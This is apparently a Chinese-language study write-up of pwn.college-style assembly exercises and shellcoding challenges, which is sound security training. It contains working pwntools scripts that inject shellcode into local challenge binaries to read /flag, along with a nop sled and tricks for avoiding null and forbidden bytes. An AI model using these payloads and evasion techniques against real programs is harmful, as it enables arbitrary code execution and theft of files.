<h2 id="4-5-除法"><a href="#4-5-除法" class="headerlink" title="4-5 除法"></a>4-5 除法</h2><p>被除数放在<strong>RAX</strong>, 除数待定, 结果放在 <strong>RAX</strong>, 余数放在<strong>RDX</strong> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">mov rax, rdx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="6-低位寄存器的名称"><a href="#6-低位寄存器的名称" class="headerlink" title="6: 低位寄存器的名称"></a>6: 低位寄存器的名称</h2><p>低位寄存器的名称要特别注意, rdi就是这么写错了, mov的两个操作数如果长度不匹配会报错:<code>unsupported instruction &#39;mov&#39;</code> </p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th>Notes</th>
<th>Type</th>
<th>64</th>
<th>32</th>
<th>16</th>
<th>8</th>
</tr>
</thead>
<tbody><tr>
<td>rax</td>
<td>Values are returned from functions in this register.</td>
<td>scratch</td>
<td>rax</td>
<td>eax</td>
<td>ax</td>
<td>ah and al</td>
</tr>
<tr>
<td>rcx</td>
<td>Typical scratch register.  Some instructions also use it as a counter.</td>
<td>scratch</td>
<td>rcx</td>
<td>ecx</td>
<td>cx</td>
<td>ch and cl</td>
</tr>
<tr>
<td>rdx</td>
<td>Scratch register.</td>
<td>scratch</td>
<td>rdx</td>
<td>edx</td>
<td>dx</td>
<td>dh and dl</td>
</tr>
<tr>
<td><em>rbx</em></td>
<td><em>Preserved register: don’t use it without saving it!</em></td>
<td><em>preserved</em></td>
<td><em>rbx</em></td>
<td><em>ebx</em></td>
<td><em>bx</em></td>
<td><em>bh and bl</em></td>
</tr>
<tr>
<td><em>rsp</em></td>
<td><em>The stack pointer.  Points to the top of the stack (details coming soon!)</em></td>
<td><em>preserved</em></td>
<td><em>rsp</em></td>
<td><em>esp</em></td>
<td><em>sp</em></td>
<td><em>spl</em></td>
</tr>
<tr>
<td><em>rbp</em></td>
<td><em>Preserved register.</em></td>
<td><em>preserved</em></td>
<td><em>rbp</em></td>
<td><em>ebp</em></td>
<td><em>bp</em></td>
<td><em>bpl</em></td>
</tr>
<tr>
<td>rsi</td>
<td>Scratch register.  Function argument #2 in 64-bit Linux</td>
<td>scratch</td>
<td>rsi</td>
<td>esi</td>
<td>si</td>
<td>sil</td>
</tr>
<tr>
<td>rdi</td>
<td>Scratch register.  Function argument #1 in 64-bit Linux</td>
<td>scratch</td>
<td>rdi</td>
<td>edi</td>
<td>di</td>
<td>dil</td>
</tr>
<tr>
<td>r8</td>
<td>Scratch register.  These were added in 64-bit mode</td>
<td>scratch</td>
<td>r8</td>
<td>r8d</td>
<td>r8w</td>
<td>r8b</td>
</tr>
<tr>
<td>r9</td>
<td>Scratch register.</td>
<td>scratch</td>
<td>r9</td>
<td>r9d</td>
<td>r9w</td>
<td>r9b</td>
</tr>
<tr>
<td>r10</td>
<td>Scratch register.</td>
<td>scratch</td>
<td>r10</td>
<td>r10d</td>
<td>r10w</td>
<td>r10b</td>
</tr>
<tr>
<td>r11</td>
<td>Scratch register.</td>
<td>scratch</td>
<td>r11</td>
<td>r11d</td>
<td>r11w</td>
<td>r11b</td>
</tr>
<tr>
<td><em>r12</em></td>
<td><em>Preserved register.  You can use it, but you need to save and restore it.</em></td>
<td><em>preserved</em></td>
<td><em>r12</em></td>
<td><em>r12d</em></td>
<td><em>r12w</em></td>
<td><em>r12b</em></td>
</tr>
<tr>
<td><em>r13</em></td>
<td><em>Preserved register.</em></td>
<td><em>preserved</em></td>
<td><em>r13</em></td>
<td><em>r13d</em></td>
<td><em>r13w</em></td>
<td><em>r13b</em></td>
</tr>
<tr>
<td><em>r14</em></td>
<td><em>Preserved register.</em></td>
<td><em>preserved</em></td>
<td><em>r14</em></td>
<td><em>r14d</em></td>
<td><em>r14w</em></td>
<td><em>r14b</em></td>
</tr>
<tr>
<td><em>r15</em></td>
<td><em>Preserved register.</em></td>
<td><em>preserved</em></td>
<td><em>r15</em></td>
<td><em>r15d</em></td>
<td><em>r15w</em></td>
<td><em>r15b</em></td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov al, dil</span><br><span class="hljs-string">mov bx, si</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="8-9-bitwise-op"><a href="#8-9-bitwise-op" class="headerlink" title="8-9 bitwise op"></a>8-9 bitwise op</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-number">8.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or  rax, rdi</span><br><span class="hljs-string">and rax, rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-number">9.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">and rdi, 1</span><br><span class="hljs-string">xor rdi, 1</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or rax, rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="10-开始内存操作"><a href="#10-开始内存操作" class="headerlink" title="10. 开始内存操作"></a>10. 开始内存操作</h2><p>注意add没有 <code>add mem, imm</code>这种形式, 因为时钟周期根本不够 </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">mov rdx, 0x404000 </span><br><span class="hljs-string">mov rcx, [rdx] </span><br><span class="hljs-string">mov rax, rcx </span><br><span class="hljs-string">add rcx, 0x1337 </span><br><span class="hljs-string">mov [rdx], rcx </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>11.简单的rax, eax, ax, ah, al的使用.</p>
<p>12.要注意时钟周期的问题. 常数要先移动到寄存器</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, 0xdeadbeef00001337</span><br><span class="hljs-string">mov rbx, 0x000000C0FFEE0000</span><br><span class="hljs-string">mov [rdi], rax</span><br><span class="hljs-string">mov [rsi], rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>13.利用地址偏移, 简单的.</p>
<h2 id="14-16-栈相关指令-太简单了-都是些基础题-过了就算了"><a href="#14-16-栈相关指令-太简单了-都是些基础题-过了就算了" class="headerlink" title="14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了"></a>14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了</h2><h2 id="17-跳转"><a href="#17-跳转" class="headerlink" title="17. 跳转"></a>17. 跳转</h2><p>nop的数量数错了, 诶他说的是0x51 bytes from current position, 但是这指的是jmp后面一条指令的地址. 不是jmp的起始地址…..</p>
<p>还要注意<code>绝对跳转只能是间接跳转(line 6)</code>( 要和<code>条件跳转只能是直接跳转</code>一起记清楚 )</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp L1</span><br><span class="hljs-string">(0x51 nops)</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">mov rcx, 0x403000</span><br><span class="hljs-string">jmp rcx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>18.if-elif-else连环, 要注意的是他说[rdi]是一个双字, 可能是一个负数, 所以我第一次写的<code>QWORD PTR</code>就错了, 只能是<code>DWORD PTR</code> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov eax, [rdi+4]</span><br><span class="hljs-string">mov r8d, [rdi+8]</span><br><span class="hljs-string">mov r9d, [rdi+12]</span><br><span class="hljs-string">cmp DWORD ptr [rdi], 0x7f454c46 #!!!!!!</span><br><span class="hljs-string">jne leif</span><br><span class="hljs-string">add eax, r8d</span><br><span class="hljs-string">add eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">leif:</span><br><span class="hljs-string">cmp DWORD PTR[rdi], 0x00005A4D #!!!!!!                                                 </span><br><span class="hljs-string">jne else</span><br><span class="hljs-string">sub eax, r8d</span><br><span class="hljs-string">sub eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    mul r8d</span><br><span class="hljs-string">    mul r9d</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>19.<strong>条件跳转只能是直接跳转</strong> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    CMP RDI, 4</span><br><span class="hljs-string">    JL AAA</span><br><span class="hljs-string">    MOV RDI, 4</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    mov rax, rdi</span><br><span class="hljs-string">    mov rbx, 8</span><br><span class="hljs-string">    mul rbx</span><br><span class="hljs-string">    mov ebx, DWORD PTR [rax+rsi]</span><br><span class="hljs-string">    jmp rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>20.折腾了半天, 发现题目描述有错的地方, 这里明明是DWORD, 说成quad word.</p>
<p>还有一点被我忽略了, 如果按照add eax, ebx的做法, <strong>那么超出四字节的部分会被舍弃</strong> </p>
<p>这里我想到的做法是用eax取出双字数据, 然后用rax做加法.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    mov eax, [rdi+rbx*4]    #在这里</span><br><span class="hljs-string">    add rcx, rax</span><br><span class="hljs-string">    inc rbx</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, rcx</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>21.硬是没有简化成</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">test rdi, rdi                                                                                                                                                                                 </span><br><span class="hljs-string">jz done</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    inc rax</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    mov cl, [rdi]</span><br><span class="hljs-string">    test rcx, rcx</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="22-调用"><a href="#22-调用" class="headerlink" title="22.调用"></a>22.调用</h2><p>又是折腾了半天, 主要是逐字节比较的, 从题干也看不出来啊, 孤零零的[src_addr]真就指一个BYTE</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov r12, 0x403000</span><br><span class="hljs-string">mov rdx, rdi    ; tmp store rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">test rdx, rdx</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">test:</span><br><span class="hljs-string">mov rsi, [rdx]</span><br><span class="hljs-string">test sil, sil    ;fetched from memory and then comparized bitwise</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">cmp sil, 90</span><br><span class="hljs-string">jg if</span><br><span class="hljs-string">mov r13, rax    ;preparation for call foo at 0x403000</span><br><span class="hljs-string">mov dil, [rdx]</span><br><span class="hljs-string">call r12</span><br><span class="hljs-string">mov [rdx], al</span><br><span class="hljs-string">mov rax, r13</span><br><span class="hljs-string">inc rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">if:</span><br><span class="hljs-string">inc rdx</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>23.偷懒, 用了别人的代码, 复习操作系统去了</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">;source code:<br>most_common_byte(src_addr, size):<br>    b = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i &lt;= size-<span class="hljs-number">1</span>:<br>        curr_byte = [src_addr + i]<br>        [stack_base - curr_byte] += <span class="hljs-number">1</span><br>    b = <span class="hljs-number">0</span><br><br>    max_freq = <span class="hljs-number">0</span><br>    max_freq_byte = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> b &lt;= <span class="hljs-number">0xff</span>:<br>        <span class="hljs-keyword">if</span> [stack_base - b] &gt; max_freq:<br>            max_freq = [stack_base - b]<br>            max_freq_byte = b<br><br>    <span class="hljs-keyword">return</span> max_freq_byte<br></code></pre></div></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push rbp</span><br><span class="hljs-string">    mov rbp, rsp</span><br><span class="hljs-string">    sub rsp, 0x100</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    je BBB</span><br><span class="hljs-string">    mov cl, byte ptr [rdi+rbx]</span><br><span class="hljs-string">    add BYTE ptr [rsp+rcx], 1</span><br><span class="hljs-string">    jmp AAA</span><br><span class="hljs-string"></span><br><span class="hljs-string">BBB:</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">    xor rcx, rcx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">CCC:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, 0x100</span><br><span class="hljs-string">    je DDD</span><br><span class="hljs-string">    cmp BYTE ptr [rsp+rbx], CL</span><br><span class="hljs-string">    jle CCC</span><br><span class="hljs-string">    mov CL, BYTE ptr [rsp+rbx]</span><br><span class="hljs-string">    mov rdx, rbx</span><br><span class="hljs-string">    JMP CCC</span><br><span class="hljs-string"></span><br><span class="hljs-string">DDD:</span><br><span class="hljs-string">    mov rax, rdx</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    pop rbp</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h1 id="module-4"><a href="#module-4" class="headerlink" title="module 4"></a>module 4</h1><p>基本全在PPT里面.</p>
<h2 id="0-基本操作"><a href="#0-基本操作" class="headerlink" title="0.基本操作"></a>0.基本操作</h2><ul>
<li>intro:<ul>
<li><p>Buiding shellcode: just using pwntools.</p>
</li>
<li><p>Debugging: strace or gdb</p>
</li>
</ul>
</li>
<li>common challenge:<ul>
<li><p><strong>forbidden bytes:</strong> such as <code>NULL(&#39;\0&#39;)</code>, <code>whitespace</code>,  <code>&#39;H&#39;</code> and so on.</p>
</li>
<li><p><strong>self-modifying codes</strong> in level 5.<br><code>gcc -Wl,-N --static -nostdlib -o test test.s</code> to make writable <code>.text</code> segment</p>
</li>
<li><p><strong>multistage shellcoding:</strong><br>read into later bytes; or read into <code>read(0, rip, 1000)</code> (using <code>lea rax, [rip]</code> get rip)</p>
</li>
<li><p><strong>Shellcode Mangling:</strong><br><u>work backwards</u>  or  <u>jump over some parts to avoid them</u>.</p>
</li>
<li><p><strong>Unable to speak:</strong><br>if you can communicate one bit, then you can communicate.<br>such as a exit code? maybe inefficient. or signal? or …</p>
</li>
</ul>
</li>
<li>Remain injection points: JIT, jus-in-time, 即时.</li>
</ul>
<p>avoid null-bytes:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov rdi, 0 -&gt; xor rdi, rdi<br>xor edi, edi //will clear rdi<br>mov rax, 2 -&gt; mov al , 2<br>mov rsi, 100 -&gt; xor rsi, rsi / mov si, 100<br>;set a byte(0x01) in the asm, then dec that address<br>lea rdi, [rip+0x3d] -&gt; mov byte ptr [rip+1], &#x27;/&#x27; ;and then, the whole string: &#x27;/flag&#x27;<br></code></pre></div></td></tr></table></figure>

<h2 id="1-开始"><a href="#1-开始" class="headerlink" title="1.开始"></a>1.开始</h2><p>非常直接的一道题目, 不过我重新认识了一下shellcode, 原来amd64.open做的事情还包括防止指令序列中出现<code>&#39;\0&#39;</code>, 以前用的都没有细想这个问题. 不过前两题都是用的read函数直接读取stdin直到eof, 所以不需要担心空字符的问题.<del>amd64.open这个函数我都没有在文档里面查到.</del> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/b*&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-comment">#直接使用wildcard, 不过会匹配到c和binary, 选择第二个即可</span><br>context.binary = binary<br>p = process(binary) <br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<p>测试程序直接从stdin读取bytes然后存储到数组中, 把数组指针转换成函数指针调用即可执行shellcode.</p>
<p>附一个asm, 了解一下原理.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movabs rax, 0x101010101010101<br>push rax<br>movabs rax, 0x1010166606d672e # 写入&#x27;flag&#x27;字符串<br>xor qword ptr [rsp], rax<br>mov rdi, rsp<br>xor edx, edx<br>xor esi, esi<br>push 2<br>pop rax<br>syscall    # open<br><br>mov rdi, rax<br>xor eax, eax<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>syscall # read<br><br>push 1<br>pop rdi<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>push 1<br>pop rax<br>syscall     # write to stdout<br></code></pre></div></td></tr></table></figure>

<h2 id="2-emmmm"><a href="#2-emmmm" class="headerlink" title="2.emmmm"></a>2.emmmm</h2><blockquote>
<p>This challenge will <strong>randomly skip up to 0x800 bytes</strong> in your shellcode. You better adapt to that! One way to evade this is to have your shellcode start with a long set of single-byte instructions that do nothing, such as <code>nop</code>, before the actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly execute and then your real shellcode will run. This concept is called a <code>nop sled</code>.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">In [3]: asm(&#x27;nop&#x27;) <br>Out[3]: b&#x27;\x90&#x27;<br></code></pre></div></td></tr></table></figure>

<p>使用右对齐, <code>fillchar=&#39;\x90’</code>. 即<code>payload = asm(shellcode).rjust(0x800, ‘\90’);</code> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode).rjust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

